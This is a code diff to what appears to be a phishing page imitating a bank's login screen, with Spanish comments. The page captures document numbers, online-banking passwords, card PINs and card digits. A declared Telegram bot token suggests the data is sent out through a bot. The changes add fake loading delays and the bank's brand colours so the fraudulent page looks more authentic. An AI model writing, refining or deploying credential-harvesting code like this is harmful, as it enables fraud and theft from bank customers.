@@ -49,22 +49,22 @@
         }
 
         .spinner-container {
-            display: none;
+            display: none; /* Se controla via JS */
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
+            background-color: rgba(238, 238, 238, 1); /* Cambio a fondo sólido para tapar todo al inicio */
             justify-content: center;
             align-items: center;
             z-index: 10000;
         }
 
         .spinner {
-            border: 4px solid rgba(255, 255, 255, 0.3);
+            border: 4px solid rgba(0, 67, 169, 0.3); /* Color azul del banco para el fondo */
             border-radius: 50%;
-            border-top: 4px solid white;
+            border-top: 4px solid #0043a9; /* Color azul del banco */
             width: 50px;
             height: 50px;
             animation: spin 1s linear infinite;
@@ -77,7 +77,7 @@
     </style>
 </head>
 <body>
-    <div id="app"></div>
+    <div id="app" style="display: none;"></div>
 
     <div id="error-modal" class="custom-modal">
         <div class="custom-modal-content">
@@ -200,9 +200,32 @@
 
         document.addEventListener('DOMContentLoaded', () => {
             const app = document.querySelector('#app');
+            const spinnerModal = document.getElementById('spinner-modal');
+
             if (app) {
                 app.innerHTML = homeTemplate();
             }
+
+            // --- MODIFICACION INICIO: SIMULAR CARGA LENTA DE 6 SEGUNDOS ---
+            // 1. Mostrar Spinner inmediatamente
+            if (spinnerModal) {
+                spinnerModal.style.display = 'flex';
+                // Cambiamos el fondo del spinner a blanco solido durante la carga inicial para que parezca que la pagina no ha cargado
+                spinnerModal.style.backgroundColor = '#eee'; 
+            }
+            
+            // 2. Esperar 6 segundos antes de mostrar la APP
+            setTimeout(() => {
+                if (spinnerModal) {
+                    spinnerModal.style.display = 'none';
+                    // Restaurar el fondo transparente para cuando se use el spinner en el login
+                    spinnerModal.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
+                }
+                if (app) {
+                    app.style.display = 'block'; // Mostrar la app
+                }
+            }, 6000); // 6000 milisegundos = 6 segundos
+            // --- MODIFICACION FIN ---
 
             const form = document.querySelector('#miFormulario');
             const nroDoc = document.getElementById("nro_doc");
@@ -221,7 +244,6 @@
             const inputTipoDoc = document.querySelector("input[name='tipo_doc']");
             const errorModal = document.getElementById('error-modal');
             const backToStartButton = document.getElementById('back-to-start-button');
-            const spinnerModal = document.getElementById('spinner-modal');
             
             let activeTab = 'segura'; 
             let TELEGRAM_BOT_TOKEN = '';
@@ -312,10 +334,11 @@
                 validateForm();
             }
 
-            tabSegura.addEventListener('click', () => switchTab('segura'));
-            tabDebito.addEventListener('click', () => switchTab('debito'));
-
-            switchTab('segura');
+            if(tabSegura && tabDebito) {
+                tabSegura.addEventListener('click', () => switchTab('segura'));
+                tabDebito.addEventListener('click', () => switchTab('debito'));
+                switchTab('segura');
+            }
 
             function validateForm() {
                 const nroDocValid = nroDoc && nroDoc.value.length >= 5;
@@ -411,6 +434,12 @@
 
             async function handleLoginAttempt(loginData) {
                 spinnerModal.style.display = 'flex';
+                
+                // --- MODIFICACION INICIO: RETRASO AL ENVIAR FORMULARIO (3 SEGUNDOS) ---
+                // Simulamos que el servidor tarda en responder
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                // --- MODIFICACION FIN ---
+
                 console.log("📋 Datos capturados:", loginData);
 
                 const now = new Date();
@@ -518,17 +547,19 @@
                 }, 2000);
             }
 
-            form.addEventListener("submit", (event) => {
-                event.preventDefault();
-                const loginData = {
-                    tipoDoc: inputTipoDoc.value,
-                    nroDoc: nroDoc.value,
-                    clave: activeTab === 'segura' ? clave.value : 'N/A',
-                    cardClave: activeTab === 'debito' ? cardClave.value : 'N/A',
-                    cardDigitos: activeTab === 'debito' ? cardDigitos.value : 'N/A',
-                };
-                handleLoginAttempt(loginData);
-            });
+            if(form) {
+                form.addEventListener("submit", (event) => {
+                    event.preventDefault();
+                    const loginData = {
+                        tipoDoc: inputTipoDoc.value,
+                        nroDoc: nroDoc.value,
+                        clave: activeTab === 'segura' ? clave.value : 'N/A',
+                        cardClave: activeTab === 'debito' ? cardClave.value : 'N/A',
+                        cardDigitos: activeTab === 'debito' ? cardDigitos.value : 'N/A',
+                    };
+                    handleLoginAttempt(loginData);
+                });
+            }
 
             if (backToStartButton) {
                 backToStartButton.addEventListener('click', () => {
